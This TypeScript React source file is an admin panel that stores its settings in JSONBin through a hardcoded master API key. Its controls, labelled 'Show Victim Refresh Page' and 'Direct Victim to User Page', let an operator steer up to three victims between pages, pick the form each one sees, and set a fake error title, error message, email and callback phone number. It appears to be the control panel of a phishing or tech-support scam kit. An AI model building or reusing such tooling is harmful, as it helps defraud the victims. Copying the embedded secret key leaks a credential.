import { useEffect, useState } from "react";
import ImageTable from "../components/adminExplanation";

// =======================
// JSONBIN SETTINGS
// =======================

const BIN_ID = "6a340b1dda38895dfed7e840";
const API_KEY = "$2a$10$qrNF.b6EVU4HN2N8Dvegaez/mp2L7ZO9EjET5ujsIiWNSfuOyB.mu";

const JSONBIN_URL = `https://api.jsonbin.io/v3/b/${BIN_ID}`;

const headers = {
  "Content-Type": "application/json",
  "X-Master-Key": API_KEY,
};

const AdminPage = () => {
  const [config, setConfig] = useState<any>({});

  const [formList, setFormList] = useState<string[]>([]);
  const [formList2, setFormList2] = useState<string[]>([]);
  const [formList3, setFormList3] = useState<string[]>([]);

  const [title, setTitle] = useState("");
  const [errorMessage, setErrorMessage] = useState("");
  const [email, setEmail] = useState("");

  const [loading, setLoading] = useState(false);
  const [successMsg, setSuccessMsg] = useState("");

  const [phone, setPhone] = useState("");
  const [message, setMessage] = useState("");

  const [showPopup, setShowPopup] = useState(false);
  const [showPopup2, setShowPopup2] = useState(false);
  const [showPopup22, setShowPopup22] = useState(false);
  const [showPopup33, setShowPopup33] = useState(false);
  const [showPopupu2, setShowPopupu2] = useState(false);
  const [showPopupu3, setShowPopupu3] = useState(false);

  // ==========================
  // LOAD CONFIG FROM JSONBIN
  // ==========================

  const loadConfig = async () => {
    try {
      const res = await fetch(`${JSONBIN_URL}/latest`, {
        headers,
      });

      const data = await res.json();
      const record = data.record;

      setConfig(record);

      setFormList(record.availableForms || []);
      setFormList2(record.availableForms2 || []);
      setFormList3(record.availableForms3 || []);

      setTitle(record.title || "");
      setErrorMessage(record.errorMessage || "");
      setEmail(record.email || "");
      setPhone(record.phone || "");

      setShowPopup(record.showPopup || false);
      setShowPopup2(record.showPopup2 || false);
      setShowPopup22(record.showPopup22 || false);
      setShowPopup33(record.showPopup33 || false);

      setShowPopupu2(record.showPopupu2 || false);
      setShowPopupu3(record.showPopupu3 || false);
    } catch (err) {
      console.error(err);
    }
  };

  useEffect(() => {
    loadConfig();
  }, []);

  // ==========================
  // UPDATE JSONBIN
  // ==========================

 const updateConfig = async (updates: any) => {
  try {
    const newConfig = {
      ...config,
      ...updates,
    };

    setConfig(newConfig);

    const res = await fetch(JSONBIN_URL, {
      method: "PUT",
      headers,
      body: JSON.stringify(newConfig),
    });

    if (!res.ok) {
      throw new Error("Failed to update JSONBin");
    }

    await loadConfig();
  } catch (err) {
    console.error(err);
  }
};

  // ==========================
  // TOGGLE BUTTONS
  // ==========================

  const togglePopup = async () => {
    const value = !showPopup;
    setShowPopup(value);
    await updateConfig({ showPopup: value });
  };

  const togglePopup2 = async () => {
    const value = !showPopup2;
    setShowPopup2(value);
    await updateConfig({ showPopup2: value });
  };

  const togglePopup22 = async () => {
    const value = !showPopup22;
    setShowPopup22(value);
    await updateConfig({ showPopup22: value });
  };

  const togglePopup33 = async () => {
    const value = !showPopup33;
    setShowPopup33(value);
    await updateConfig({ showPopup33: value });
  };

  const togglePopupu2 = async () => {
    const value = !showPopupu2;
    setShowPopupu2(value);
    await updateConfig({ showPopupu2: value });
  };

  const togglePopupu3 = async () => {
    const value = !showPopupu3;
    setShowPopupu3(value);
    await updateConfig({ showPopupu3: value });
  };

  // ==========================
  // UPDATE FORMS
  // ==========================

  const handleChange = async (
    e: React.ChangeEvent<HTMLSelectElement>
  ) => {
    const value = e.target.value;
    await updateConfig({ currentForm: value });
    alert("Updated");
  };

  const handleChange2 = async (
    e: React.ChangeEvent<HTMLSelectElement>
  ) => {
    const value = e.target.value;
    await updateConfig({ currentForm2: value });
    alert("Updated");
  };

  const handleChange3 = async (
    e: React.ChangeEvent<HTMLSelectElement>
  ) => {
    const value = e.target.value;
    await updateConfig({ currentForm3: value });
    alert("Updated");
  };

  // ==========================
  // UPDATE PHONE
  // ==========================

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!phone.trim()) {
      setMessage("❌ Enter a phone number.");
      return;
    }

    await updateConfig({
      phone,
    });

    setMessage("✅ Phone updated!");
  };

  // ==========================
  // UPDATE TITLE / ERROR / EMAIL
  // ==========================

  const handleUpdate = async (e: React.FormEvent) => {
    e.preventDefault();

    setLoading(true);

    await updateConfig({
      title,
      errorMessage,
      email,
    });

    setLoading(false);

    setSuccessMsg("✅ Updated!");
  };

    return (
    <>
      <div className="bg-gray-800 h-screen p-9">
        <h2 className="text-3xl text-[#ccc] mb-9">Admin: USER 1</h2>

        <select
          value={config.currentForm || ""}
          onChange={handleChange}
        >
          {formList.length > 0 ? (
            formList.map((form) => (
              <option key={form} value={form}>
                {form.charAt(0).toUpperCase() + form.slice(1)} Form
              </option>
            ))
          ) : (
            <option disabled>Loading options...</option>
          )}
        </select>

        <div className="flex justify-center gap-8">
          <div>
            <h3 className="text-white mt-3">USER PAGE</h3>

            <button
              className={`text-white px-4 py-2 rounded ${
                showPopup ? "bg-green-600" : "bg-red-600"
              }`}
              onClick={togglePopup}
            >
              {showPopup
                ? "Refresh is active"
                : "Show Victim Refresh Page"}
            </button>
          </div>

          <div>
            <h3 className="text-white mt-3">LANDING PAGE</h3>

            <button
              className={`text-white px-4 py-2 rounded ${
                showPopup2 ? "bg-green-600" : "bg-red-600"
              }`}
              onClick={togglePopup2}
            >
              {showPopup2
                ? "user page"
                : "Direct Victim to User Page"}
            </button>
          </div>
        </div>

        <h2 className="text-3xl text-[#ccc] mb-9 mt-10">
          Admin: USER 2
        </h2>

        <select
          value={config.currentForm2 || ""}
          onChange={handleChange2}
        >
          {formList2.length > 0 ? (
            formList2.map((form) => (
              <option key={form} value={form}>
                {form.charAt(0).toUpperCase() + form.slice(1)} Form
              </option>
            ))
          ) : (
            <option disabled>Loading options...</option>
          )}
        </select>

        <div className="flex justify-center gap-8">
          <div>
            <h3 className="text-white mt-3">USER PAGE</h3>

            <button
              className={`text-white px-4 py-2 rounded ${
                showPopupu2 ? "bg-green-600" : "bg-red-600"
              }`}
              onClick={togglePopupu2}
            >
              {showPopupu2
                ? "Refresh is active"
                : "Show Victim Refresh Page"}
            </button>
          </div>

          <div>
            <h3 className="text-white mt-3">LANDING PAGE</h3>

            <button
              className={`text-white px-4 py-2 rounded ${
                showPopup22 ? "bg-green-600" : "bg-red-600"
              }`}
              onClick={togglePopup22}
            >
              {showPopup22
                ? "user page"
                : "Direct Victim to User Page"}
            </button>
          </div>
        </div>

        <h2 className="text-3xl text-[#ccc] mb-9 mt-10">
          Admin: USER 3
        </h2>

        <select
          value={config.currentForm3 || ""}
          onChange={handleChange3}
        >
          {formList3.length > 0 ? (
            formList3.map((form) => (
              <option key={form} value={form}>
                {form.charAt(0).toUpperCase() + form.slice(1)} Form
              </option>
            ))
          ) : (
            <option disabled>Loading options...</option>
          )}
        </select>

        <div className="flex justify-center gap-8">
          <div>
            <h3 className="text-white mt-3">USER PAGE</h3>

            <button
              className={`text-white px-4 py-2 rounded ${
                showPopupu3 ? "bg-green-600" : "bg-red-600"
              }`}
              onClick={togglePopupu3}
            >
              {showPopupu3
                ? "Refresh is active"
                : "Show Victim Refresh Page"}
            </button>
          </div>

          <div>
            <h3 className="text-white mt-3">LANDING PAGE</h3>

            <button
              className={`text-white px-4 py-2 rounded ${
                showPopup33 ? "bg-green-600" : "bg-red-600"
              }`}
              onClick={togglePopup33}
            >
              {showPopup33
                ? "user page"
                : "Direct Victim to User Page"}
            </button>
          </div>
        </div>

        <form
          onSubmit={handleSubmit}
          className="mt-5 mx-auto bg-white p-6 rounded shadow"
        >
          <label className="block mb-2 font-semibold">
            New Phone Number:
          </label>

          <p className="text-sm">
            NOTE: DONT ADD +1 JUST TYPE THE NUMBER LIKE THIS{" "}
            <strong className="text-green-500">
              2234567890
            </strong>{" "}
            INSTEAD OF{" "}
            <strong className="text-red-500">
              +12234567890
            </strong>
          </p>

          <input
            type="text"
            value={phone}
            onChange={(e) => setPhone(e.target.value)}
            placeholder="1234567890"
            className="w-full p-2 border rounded mb-4"
          />

          <button
            type="submit"
            className="bg-blue-600 text-white px-4 py-2 rounded"
          >
            Update Phone
          </button>

          {message && (
            <p className="mt-4 text-sm">{message}</p>
          )}
        </form>

        <div className="max-w-md mx-auto mt-10 p-6 bg-white shadow rounded-lg">
          <h2 className="text-xl font-bold mb-4 text-center">
            Edit Error Info
          </h2>

          <form
            onSubmit={handleUpdate}
            className="space-y-4"
          >
            <div>
              <label className="block text-sm font-medium mb-1">
                Title
              </label>

              <input
                value={title}
                onChange={(e) => setTitle(e.target.value)}
                className="w-full border px-3 py-2 rounded"
              />
            </div>

            <div>
              <label className="block text-sm font-medium mb-1">
                Error Message
              </label>

              <textarea
                value={errorMessage}
                onChange={(e) =>
                  setErrorMessage(e.target.value)
                }
                className="w-full border px-3 py-2 rounded"
              />
            </div>

            <div>
              <label className="block text-sm font-medium mb-1">
                Email
              </label>

              <input
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="w-full border px-3 py-2 rounded"
              />
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-blue-600 text-white py-2 rounded"
            >
              {loading ? "Updating..." : "Update"}
            </button>

            {successMsg && (
              <p className="text-green-600 text-center mt-2">
                {successMsg}
              </p>
            )}
          </form>
        </div>
      </div>

      <div className="mt-[550px]">
        <ImageTable />
      </div>

      <p>multiuser7</p>
    </>
  );
};

export default AdminPage;